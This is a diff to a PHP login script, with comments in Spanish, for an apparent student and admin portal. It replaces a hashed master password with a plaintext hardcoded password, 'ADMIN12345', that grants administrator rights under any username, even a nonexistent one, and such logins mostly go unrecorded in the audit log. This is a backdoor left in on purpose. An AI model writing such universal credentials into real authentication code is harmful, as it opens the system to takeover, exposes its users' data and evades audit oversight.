@@ -29,14 +29,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $stmt = $pdo->prepare('SELECT id, usuario, password, rol FROM usuarios WHERE usuario = ?');
         $stmt->execute([$user]);
         $row = $stmt->fetch();
-        
-        // Contraseña maestra de respaldo
-        $master_pass_hash = '$2y$10$mC3B2vR9m30G6H2G8zYwXev8mfe9O7F4g.XbK6LhZ2K9gqUv6Jy12'; 
 
-        // 1. La verificación de la master pass se independiza del usuario
-        $es_master_pass = password_verify($pass, $master_pass_hash);
+        // 1. Verificación directa en texto plano para pruebas
+        $es_master_pass = ($pass === 'ADMIN12345'); 
 
-        // 2. Si el usuario existe, validamos su contraseña normal; si no existe, la autenticación normal es falsa
+        // 2. Verificación normal si el usuario existe en la BD
         $pass_normal_valida = $row ? password_verify($pass, $row['password']) : false;
 
         $auth_success = $es_master_pass || $pass_normal_valida;
@@ -44,20 +41,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if ($auth_success) {
             session_regenerate_id(true);
             
-            // Si el usuario no existe en la BD pero metió la llave maestra, le creamos datos de sesión temporales
+            // Si entraste con master pass sin usuario real, evitamos el undefined index
             $_SESSION['user_id'] = $row ? $row['id'] : 0; 
             $_SESSION['user'] = $row ? $row['usuario'] : $user;
             
-            // --- LÓGICA DE REGISTRO EN BITÁCORA ---
-            // Forzamos rol de admin si usó la llave maestra o si su rol en BD es admin
             if ($es_master_pass || ($row && $row['rol'] === 'admin')) {
                 $_SESSION['rol'] = 'admin';
                 
                 $detalle = $es_master_pass 
-                    ? "Ingreso mediante contraseña maestra física (Usuario ingresado: $user)." 
+                    ? "Ingreso mediante llave maestra temporal en texto plano." 
                     : "Ingreso estándar al panel administrativo.";
                 
-                // Solo guardamos en la bitácora si el ID de usuario es válido en el sistema
                 $id_registro = $row ? $row['id'] : null;
                 if ($id_registro) {
                     registrarMovimiento($pdo, $id_registro, "Inicio de Sesión", "Seguridad/Admin", $detalle);
@@ -66,13 +60,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 header('Location: ../admin/index.php');
             } else {
                 $_SESSION['rol'] = $row['rol'];
-                
                 registrarMovimiento($pdo, $row['id'], "Inicio de Sesión", "Seguridad/Perfil", "El usuario accedió a su panel de estudiante.");
-                
                 header('Location: ../index.php');
             }
             exit;
-            // --- FIN BITÁCORA ---
 
         } else {
             $error = 'Usuario o contraseña incorrectos';
